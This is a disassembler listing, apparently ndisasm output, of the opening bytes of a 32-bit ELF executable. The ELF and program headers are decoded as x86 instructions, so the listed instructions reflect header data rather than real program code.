00000000  7F45              jg 0x47
00000002  4C                dec esp
00000003  46                inc esi
00000004  0101              add [ecx],eax
00000006  0100              add [eax],eax
00000008  0000              add [eax],al
0000000A  0000              add [eax],al
0000000C  0000              add [eax],al
0000000E  0000              add [eax],al
00000010  0200              add al,[eax]
00000012  0300              add eax,[eax]
00000014  0100              add [eax],eax
00000016  0000              add [eax],al
00000018  308304083400      xor [ebx+0x340804],al
0000001E  0000              add [eax],al
00000020  80140000          adc byte [eax+eax],0x0
00000024  0000              add [eax],al
00000026  0000              add [eax],al
00000028  3400              xor al,0x0
0000002A  2000              and [eax],al
0000002C  0900              or [eax],eax
0000002E  2800              sub [eax],al
00000030  2400              and al,0x0
00000032  2100              and [eax],eax
00000034  06                push es
00000035  0000              add [eax],al
00000037  003400            add [eax+eax],dh
0000003A  0000              add [eax],al
0000003C  3480              xor al,0x80
0000003E  0408              add al,0x8
00000040  3480              xor al,0x80
00000042  0408              add al,0x8
00000044  2001              and [ecx],al
00000046  0000              add [eax],al
00000048  2001              and [ecx],al
0000004A  0000              add [eax],al
0000004C  0500000004        add eax,0x4000000
00000051  0000              add [eax],al
00000053  0003              add [ebx],al
00000055  0000              add [eax],al
00000057  00540100          add [ecx+eax+0x0],dl
0000005B  00548104          add [ecx+eax*4+0x4],dl
0000005F  08548104          or [ecx+eax*4+0x4],dl
00000063  0813              or [ebx],dl
00000065  0000              add [eax],al
00000067  0013              add [ebx],dl
00000069  0000              add [eax],al
0000006B  000400            add [eax+eax],al
0000006E  0000              add [eax],al
00000070  0100              add [eax],eax
00000072  0000              add [eax],al
00000074  0100              add [eax],eax
00000076  0000              add [eax],al
00000078  0000              add [eax],al
0000007A  0000              add [eax],al
0000007C  008004080080      add [eax-0x7ffff7fc],al
00000082  0408              add al,0x8
00000084  2406              and al,0x6
00000086  0000              add [eax],al
00000088  2406              and al,0x6
0000008A  0000              add [eax],al
0000008C  0500000000        add eax,0x0
00000091  1000              adc [eax],al
00000093  0001              add [ecx],al
00000095  0000              add [eax],al
00000097  00140F            add [edi+ecx],dl
0000009A  0000              add [eax],al
0000009C  149F              adc al,0x9f
0000009E  0408              add al,0x8
000000A0  149F              adc al,0x9f
000000A2  0408              add al,0x8
000000A4  7801              js 0xa7
000000A6  0000              add [eax],al
000000A8  800100            add byte [ecx],0x0
000000AB  0006              add [esi],al
000000AD  0000              add [eax],al
000000AF  0000              add [eax],al
000000B1  1000              adc [eax],al
000000B3  0002              add [edx],al
000000B5  0000              add [eax],al
000000B7  0028              add [eax],ch
000000B9  0F0000            sldt [eax]
000000BC  289F0408289F      sub [edi-0x60d7f7fc],bl
000000C2  0408              add al,0x8
000000C4  C8000000          enter 0x0,0x0
000000C8  C8000000          enter 0x0,0x0
000000CC  06                push es
000000CD  0000              add [eax],al
000000CF  000400            add [eax+eax],al
000000D2  0000              add [eax],al
000000D4  0400              add al,0x0
000000D6  0000              add [eax],al
000000D8  6801000068        push dword 0x68000001
000000DD  81040868810408    add dword [eax+ecx],0x8048168
000000E4  44                inc esp
000000E5  0000              add [eax],al
000000E7  00440000          add [eax+eax+0x0],al
000000EB  000400            add [eax+eax],al
000000EE  0000              add [eax],al
000000F0  0400              add al,0x0
000000F2  0000              add [eax],al
000000F4  50                push eax
000000F5  E574              in eax,0x74
000000F7  64280500002885    sub [dword fs:0x85280000],al
000000FE  0408              add al,0x8
00000100  288504083400      sub [ebp+0x340804],al
00000106  0000              add [eax],al
00000108  3400              xor al,0x0
0000010A  0000              add [eax],al
0000010C  0400              add al,0x0
0000010E  0000              add [eax],al
00000110  0400              add al,0x0
00000112  0000              add [eax],al
00000114  51                push ecx
00000115  E574              in eax,0x74
